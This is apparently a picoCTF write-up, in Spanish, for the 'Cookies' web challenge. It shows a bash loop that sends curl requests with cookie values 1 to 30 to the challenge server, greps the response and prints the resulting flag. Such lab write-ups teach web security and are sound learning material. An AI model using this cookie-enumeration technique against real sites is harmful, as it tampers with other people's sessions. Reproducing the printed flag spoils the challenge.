### Cookies
### Descripcion
Who doesn't love cookies? Try to figure out the best one.http://wily-courier.picoctf.net:56883/
### Solucion
- Con terminal
```
davidSoA-picoctf@webshell:~$ for i in {1..30}; do curl -s http://wily-courier.picoctf.net:56883/check -H "Cookie: name=$i"; done | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```
### Notas
- Estamos modificando el valor de cookies hasta encontrar la correcta que nos de la bandera.
- El for tambien existe en la consola, al momento de cambiar el valos a las Cookies da valores o palabras diferentes, esto ayuda a encontrar el valor con el grep se evita de ver muchos valores, y solo la bandera.
### Referencias
